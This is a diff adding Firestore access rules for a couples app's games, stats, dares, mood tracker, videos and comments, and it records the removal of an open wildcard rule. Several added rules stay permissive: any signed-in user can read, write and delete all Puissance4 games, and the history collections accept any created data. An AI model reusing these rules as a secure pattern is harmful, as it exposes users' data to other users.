+        resource.data.playerId == request.auth.uid ||
+        resource.data.opponentId == request.auth.uid ||
+        resource.data.winnerId == request.auth.uid ||
+        resource.data.players[0].id == request.auth.uid ||
+        resource.data.players[1].id == request.auth.uid
+      );
+      allow create: if isAuthenticated();
+      allow update: if isAuthenticated() && (
+        resource.data.playerId == request.auth.uid ||
+        resource.data.opponentId == request.auth.uid
+      );
+      allow delete: if isAuthenticated() && (
+        resource.data.playerId == request.auth.uid ||
+        resource.data.opponentId == request.auth.uid
+      );
+    }
+
+    // ========================================
+    // PUISSANCE4 GAMES
+    // ========================================
+    match /puissance4_games/{gameId} {
+      allow read, write, create, update, delete: if isAuthenticated();
+
+      // Allow subcollections
+      match /{document=**} {
+        allow read, write, create, update, delete: if isAuthenticated();
+      }
+    }
+
+    // ========================================
+    // PUISSANCE4 HISTORY
+    // ========================================
+    match /puissance4_history/{historyId} {
+      allow read: if isAuthenticated() && (
+        resource.data.playerId == request.auth.uid ||
+        resource.data.opponentId == request.auth.uid ||
+        resource.data.winnerId == request.auth.uid ||
+        resource.data.player1Id == request.auth.uid ||
+        resource.data.player2Id == request.auth.uid
+      );
+      allow create: if isAuthenticated();
+      allow update: if isAuthenticated() && (
+        resource.data.playerId == request.auth.uid ||
+        resource.data.opponentId == request.auth.uid ||
+        resource.data.player1Id == request.auth.uid ||
+        resource.data.player2Id == request.auth.uid
+      );
+      allow delete: if isAuthenticated() && (
+        resource.data.playerId == request.auth.uid ||
+        resource.data.opponentId == request.auth.uid ||
+        resource.data.player1Id == request.auth.uid ||
+        resource.data.player2Id == request.auth.uid
+      );
+    }
+
+    // ========================================
+    // GAME STATISTICS (All Games)
+    // ========================================
+    // Word Search Stats
+    match /word_search_stats/{userId} {
+      allow read: if isAuthenticated() && userId == request.auth.uid;
+      allow create, update: if isAuthenticated() && userId == request.auth.uid;
+      allow delete: if isAuthenticated() && userId == request.auth.uid;
+    }
+
+    // Crossword Stats
+    match /crossword_stats/{userId} {
+      allow read: if isAuthenticated() && userId == request.auth.uid;
+      allow create, update: if isAuthenticated() && userId == request.auth.uid;
+      allow delete: if isAuthenticated() && userId == request.auth.uid;
+    }
+
+    // Quiz Couple Stats
+    match /quiz_couple_stats/{userId} {
+      allow read: if isAuthenticated() && userId == request.auth.uid;
+      allow create, update: if isAuthenticated() && userId == request.auth.uid;
+      allow delete: if isAuthenticated() && userId == request.auth.uid;
+    }
+
+    // Puissance4 Stats
+    match /puissance4_stats/{userId} {
+      allow read: if isAuthenticated() && userId == request.auth.uid;
+      allow create, update: if isAuthenticated() && userId == request.auth.uid;
+      allow delete: if isAuthenticated() && userId == request.auth.uid;
+    }
+
+    // Morpion Stats
+    match /morpion_stats/{userId} {
+      allow read: if isAuthenticated() && userId == request.auth.uid;
+      allow create, update: if isAuthenticated() && userId == request.auth.uid;
+      allow delete: if isAuthenticated() && userId == request.auth.uid;
+    }
+
+    // Game History (Leaderboards, Match History)
+    match /game_history/{historyId} {
+      allow read: if isAuthenticated() && (
+        resource.data.playerId == request.auth.uid ||
+        resource.data.player1Id == request.auth.uid ||
+        resource.data.player2Id == request.auth.uid
+      );
+      allow create: if isAuthenticated() && (
+        request.resource.data.playerId == request.auth.uid ||
+        request.resource.data.player1Id == request.auth.uid ||
+        request.resource.data.player2Id == request.auth.uid
+      );
+      allow update: if isAuthenticated() && (
+        resource.data.playerId == request.auth.uid ||
+        resource.data.player1Id == request.auth.uid ||
+        resource.data.player2Id == request.auth.uid
+      );
+      allow delete: if isAuthenticated() && (
+        resource.data.playerId == request.auth.uid ||
+        resource.data.player1Id == request.auth.uid ||
+        resource.data.player2Id == request.auth.uid
+      );
+    }
+
+    // ========================================
+    // DARE TO PLAY (Game Challenges)
+    // ========================================
+    match /dares/{dareId} {
+      // Read: sender or receiver
+      allow read: if isAuthenticated() && (
+        resource.data.fromUserId == request.auth.uid ||
+        resource.data.toUserId == request.auth.uid
+      );
+
+      // Create: authenticated users, must be sender
+      allow create: if isAuthenticated() &&
+        request.resource.data.fromUserId == request.auth.uid;
+
+      // Update: sender or receiver (for accepting/declining)
+      allow update: if isAuthenticated() && (
+        resource.data.fromUserId == request.auth.uid ||
+        resource.data.toUserId == request.auth.uid
+      );
+
+      // Delete: only sender can delete their dare
+      allow delete: if isAuthenticated() &&
+        resource.data.fromUserId == request.auth.uid;
+    }
+
+    // ========================================
+    // DARE STATS (User dare statistics)
+    // ========================================
+    match /users/{userId}/stats/dares {
+      // Users can read their own stats
+      allow read: if isAuthenticated() && userId == request.auth.uid;
+
+      // Users can create/update their own stats
+      allow create, update: if isAuthenticated() && userId == request.auth.uid;
+
+      // Users can delete their own stats
+      allow delete: if isAuthenticated() && userId == request.auth.uid;
+    }
+
+    // ========================================
+    // VIBRATE MESSAGES (Remote vibration feature)
+    // ========================================
+    match /vibrateMessages/{messageId} {
+      // Read: sender or receiver
+      allow read: if isAuthenticated() && (
+        resource.data.fromUserId == request.auth.uid ||
+        resource.data.toUserId == request.auth.uid
+      );
+
+      // Create: authenticated users, must be sender
+      allow create: if isAuthenticated() &&
+        request.resource.data.fromUserId == request.auth.uid;
+
+      // Update: sender or receiver (for marking as seen)
+      allow update: if isAuthenticated() && (
+        resource.data.fromUserId == request.auth.uid ||
+        resource.data.toUserId == request.auth.uid
+      );
+
+      // Delete: only sender can delete their vibrate message
+      allow delete: if isAuthenticated() &&
+        resource.data.fromUserId == request.auth.uid;
+    }
+
+    // ========================================
+    // MOOD TRACKER (Mood Entries)
+    // ========================================
+    match /moodEntries/{entryId} {
+      // Read: user can read their own entries or their partner's entries
+      // Check if the entry belongs to your partner by looking up the users collection
+      allow read: if isAuthenticated() && (
+        resource.data.userId == request.auth.uid ||
+        get(/databases/$(database)/documents/users/$(request.auth.uid)).data.partnerId == resource.data.userId
+      );
+
+      // Create: authenticated users, must be their own entry
+      allow create: if isAuthenticated() &&
+        request.resource.data.userId == request.auth.uid;
+
+      // Update: only the owner can update their entry
+      allow update: if isAuthenticated() &&
+        resource.data.userId == request.auth.uid;
+
+      // Delete: only the owner can delete their entry
+      allow delete: if isAuthenticated() &&
+        resource.data.userId == request.auth.uid;
+    }
+
+    // ========================================
+    // MOOD TRACKER SETTINGS
+    // ========================================
+    match /moodSettings/{userId} {
+      // Read: user can read their own settings OR their partner can read (for notifications)
+      allow read: if isAuthenticated() && (
+        userId == request.auth.uid ||
+        get(/databases/$(database)/documents/users/$(userId)).data.partnerId == request.auth.uid
+      );
+
+      // Create: authenticated users, must be their own settings
+      allow create: if isAuthenticated() && userId == request.auth.uid;
+
+      // Update: only the user can update their own settings
+      allow update: if isAuthenticated() && userId == request.auth.uid;
+
+      // Delete: only the user can delete their own settings
+      allow delete: if isAuthenticated() && userId == request.auth.uid;
+    }
+
+    // ========================================
+    // VIDEO GALLERY
+    // ========================================
+    match /videos/{videoId} {
+      // Read: uploader or partner if shared
+      allow read: if isAuthenticated() && (
+        resource.data.uploadedBy == request.auth.uid ||
+        (resource.data.isSharedWithPartner == true &&
+         resource.data.partnerId == request.auth.uid)
+      );
+
+      // Create: authenticated users, must be uploader
+      allow create: if isAuthenticated() &&
+        request.resource.data.uploadedBy == request.auth.uid;
+
+      // Update: only uploader can update
+      allow update: if isAuthenticated() &&
+        resource.data.uploadedBy == request.auth.uid;
+
+      // Delete: only uploader can delete
+      allow delete: if isAuthenticated() &&
+        resource.data.uploadedBy == request.auth.uid;
+    }
+
+    // ========================================
+    // WATCH PARTIES (Video Sync)
+    // ========================================
+    match /watchParties/{partyId} {
+      // Read: host or guest
+      allow read: if isAuthenticated() && (
+        resource.data.hostId == request.auth.uid ||
+        resource.data.guestId == request.auth.uid
+      );
+
+      // Create: authenticated users, must be host
+      allow create: if isAuthenticated() &&
+        request.resource.data.hostId == request.auth.uid;
+
+      // Update: host or guest can update (for sync)
+      allow update: if isAuthenticated() && (
+        resource.data.hostId == request.auth.uid ||
+        resource.data.guestId == request.auth.uid
+      );
+
+      // Delete: only host can delete
+      allow delete: if isAuthenticated() &&
+        resource.data.hostId == request.auth.uid;
+    }
+
+    // ========================================
+    // VIDEO COMMENTS
+    // ========================================
+    match /videoComments/{commentId} {
+      // Read: anyone authenticated can read comments
+      allow read: if isAuthenticated();
+
+      // Create: authenticated users, must be commenter
+      allow create: if isAuthenticated() &&
+        request.resource.data.userId == request.auth.uid;
+
+      // Update: only commenter can update
+      allow update: if isAuthenticated() &&
+        resource.data.userId == request.auth.uid;
+
+      // Delete: only commenter can delete
+      allow delete: if isAuthenticated() &&
+        resource.data.userId == request.auth.uid;
+    }
+
+    // ========================================
+    // Media Comments (Photos, Videos, Notes)
+    // ========================================
+    match /mediaComments/{commentId} {
+      // Read: any authenticated user can read comments
+      allow read: if isAuthenticated();
+
+      // Create: authenticated users can create comments
+      allow create: if isAuthenticated() &&
+        request.resource.data.userId == request.auth.uid &&
+        request.resource.data.keys().hasAll(['mediaId', 'mediaType', 'text', 'createdAt']);
+
+      // Update:
+      // 1. Author can update their comment text
+      // 2. Anyone authenticated can increment replyCount (for replying to comments)
+      allow update: if isAuthenticated() && (
+        resource.data.userId == request.auth.uid ||
+        (request.resource.data.diff(resource.data).affectedKeys().hasOnly(['replyCount']) &&
+         request.resource.data.replyCount > resource.data.replyCount)
+      );
+
+      // Delete: only the comment author can delete their own comments
+      // (Cascade deletion of replies is handled by client code)
+      allow delete: if isAuthenticated() &&
+        resource.data.userId == request.auth.uid;
+    }
+
+    // Comment Notifications
+    match /commentNotifications/{notificationId} {
+      // Read: only the user whose ID is in the notificationId can read
+      // notificationId format: userId_mediaType_mediaId
+      allow read: if isAuthenticated() &&
+        notificationId.matches('^' + request.auth.uid + '_.*');
+
+      // Create/Update: users can create/update their own notifications
+      // notificationId format: userId_mediaType_mediaId
+      allow create, update: if isAuthenticated() &&
+        notificationId.matches('^' + request.auth.uid + '_.*');
+
+      // Delete: users can delete their own notifications
+      allow delete: if isAuthenticated() &&
+        notificationId.matches('^' + request.auth.uid + '_.*');
+    }
+
+    // ========================================
+    // WILDCARD RULE REMOVED FOR SECURITY
+    // ========================================
+    // The previous wildcard rule "match /{document=**} { allow read, write: if true; }"
+    // was EXTREMELY DANGEROUS as it allowed ANYONE (even unauthenticated users) to
+    // read/write ANYWHERE in the database, overriding all specific rules above.
+    // All collections now use specific security rules defined above.
+  }
+}
